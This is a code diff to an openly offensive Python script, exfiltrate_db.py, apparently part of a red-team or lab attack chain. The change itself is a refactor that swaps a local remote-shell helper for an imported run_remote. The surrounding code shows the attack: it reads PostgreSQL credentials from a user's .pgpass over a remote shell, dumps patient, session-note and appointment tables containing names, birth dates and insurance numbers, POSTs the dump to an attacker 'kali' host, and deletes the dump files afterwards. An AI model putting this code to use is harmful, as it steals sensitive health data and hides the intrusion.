@@ -4,7 +4,7 @@ import socket
 import subprocess
 import time
 
-from chainlog import log
+from chainlog import log, run_remote
 
 # =============================================================================
 # exfiltrate_db.py — DB Exfiltration from John's Workstation
@@ -20,9 +20,6 @@ EXFIL_LOCAL_PATH = "/tmp/db_exfil.dump"   # written on kali
 
 PGPASS_PATH = "/home/john.stravidis/projects/waystar-connect/.pgpass"
 DUMP_PATH   = "/tmp/db_dump.dump"          # assembled on workstation
-
-_sentinel_seq = 0
-
 
 # ---------------------------------------------------------------------------
 # Shell helpers
@@ -43,47 +40,6 @@ def _first_int(raw: str) -> str:
             return clean
     return "?"
 
-
-def _drain(shell):
-    prev = shell.gettimeout()
-    shell.settimeout(0.1)
-    while True:
-        try:
-            if not shell.recv(4096):
-                break
-        except socket.timeout:
-            break
-    shell.settimeout(prev)
-
-
-def _run_remote(shell, cmd, timeout=15):
-    global _sentinel_seq
-    _sentinel_seq += 1
-    sentinel = f"SENTINEL_{_sentinel_seq:04X}_END"
-
-    _drain(shell)
-    shell.sendall(f"{cmd}\n".encode())
-    time.sleep(0.5)
-    shell.sendall(f"echo {sentinel}\n".encode())
-
-    prev = shell.gettimeout()
-    shell.settimeout(2)
-    buf = ""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            buf += shell.recv(4096).decode(errors="replace")
-        except socket.timeout:
-            pass
-        if sentinel in buf:
-            break
-    shell.settimeout(prev)
-
-    if sentinel in buf:
-        buf = buf[: buf.index(sentinel)]
-
-    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
-    return buf.replace("\r", "").strip()
 
 
 # ---------------------------------------------------------------------------
@@ -127,7 +83,7 @@ def _stop_receive_server(proc):
 def _discover_db_creds(john_shell):
     """Read ~/.pgpass and return the first credential dict, or None."""
     log(f"[*] Reading DB credentials from {PGPASS_PATH} ...")
-    raw = _run_remote(john_shell, f"cat {PGPASS_PATH}")
+    raw = run_remote(john_shell, f"cat {PGPASS_PATH}")
     for line in raw.splitlines():
         line = line.strip()
         if not line or line.startswith("#"):
@@ -156,7 +112,7 @@ def _dump_db(john_shell, creds):
     )
 
     log("[*] Dumping patients table ...")
-    _run_remote(
+    run_remote(
         john_shell,
         f"{psql_env}{psql_base} "
         f"-c \"SELECT id,first_name,last_name,dob,gender,ins_number,"
@@ -164,7 +120,7 @@ def _dump_db(john_shell, creds):
         f" > {DUMP_PATH} 2>/dev/null",
         timeout=20,
     )
-    row_count_raw = _run_remote(
+    row_count_raw = run_remote(
         john_shell,
         f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM patients;'",
         timeout=10,
@@ -173,7 +129,7 @@ def _dump_db(john_shell, creds):
     log(f"[+] patients: {row_count} rows")
 
     log("[*] Dumping session_notes table ...")
-    _run_remote(
+    run_remote(
         john_shell,
         f"echo '--- session_notes ---' >> {DUMP_PATH} && "
         f"{psql_env}{psql_base} "
@@ -182,7 +138,7 @@ def _dump_db(john_shell, creds):
         f" >> {DUMP_PATH} 2>/dev/null",
         timeout=20,
     )
-    notes_count_raw = _run_remote(
+    notes_count_raw = run_remote(
         john_shell,
         f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM session_notes;'",
         timeout=10,
@@ -191,7 +147,7 @@ def _dump_db(john_shell, creds):
     log(f"[+] session_notes: {notes_count} rows")
 
     log("[*] Dumping appointments table ...")
-    _run_remote(
+    run_remote(
         john_shell,
         f"echo '--- appointments ---' >> {DUMP_PATH} && "
         f"{psql_env}{psql_base} "
@@ -200,7 +156,7 @@ def _dump_db(john_shell, creds):
         f" >> {DUMP_PATH} 2>/dev/null",
         timeout=20,
     )
-    appt_count_raw = _run_remote(
+    appt_count_raw = run_remote(
         john_shell,
         f"{psql_env}{psql_base} -c 'SELECT COUNT(*) FROM appointments;'",
         timeout=10,
@@ -208,7 +164,7 @@ def _dump_db(john_shell, creds):
     appt_count = _first_int(appt_count_raw)
     log(f"[+] appointments: {appt_count} rows")
 
-    size_raw = _run_remote(john_shell, f"wc -c < {DUMP_PATH} 2>/dev/null || echo 0")
+    size_raw = run_remote(john_shell, f"wc -c < {DUMP_PATH} 2>/dev/null || echo 0")
     size = _first_int(size_raw)
     log(f"[+] Dump written to {DUMP_PATH} ({size} bytes)")
 
@@ -219,7 +175,7 @@ def _dump_db(john_shell, creds):
 def _send_to_kali(john_shell, kali_host, port=EXFIL_HTTP_PORT):
     """POST the dump file from the workstation to kali's receive server."""
     log(f"[*] Sending dump to {kali_host}:{port} ...")
-    _run_remote(
+    run_remote(
         john_shell,
         f"python3 -c \""
         f"import urllib.request; "
@@ -276,7 +232,7 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
         dump_bytes = 0
     if dump_bytes < 10:
         log(f"[-] Dump file appears empty ({dump_bytes} bytes) — psql may have failed; aborting")
-        _run_remote(john_shell, f"rm -f {DUMP_PATH}")
+        run_remote(john_shell, f"rm -f {DUMP_PATH}")
         return {"db_creds": creds, "exfil_path": None, "exfil_ok": False, "stats": stats}
 
     # Phase 3 — Send to kali
@@ -287,7 +243,7 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
         _stop_receive_server(recv_proc)
 
     # Cleanup — remove dump from workstation and kali
-    _run_remote(john_shell, f"rm -f {DUMP_PATH}")
+    run_remote(john_shell, f"rm -f {DUMP_PATH}")
     log(f"[+] Removed {DUMP_PATH} from workstation")
 
     if exfil_ok and os.path.exists(EXFIL_LOCAL_PATH):
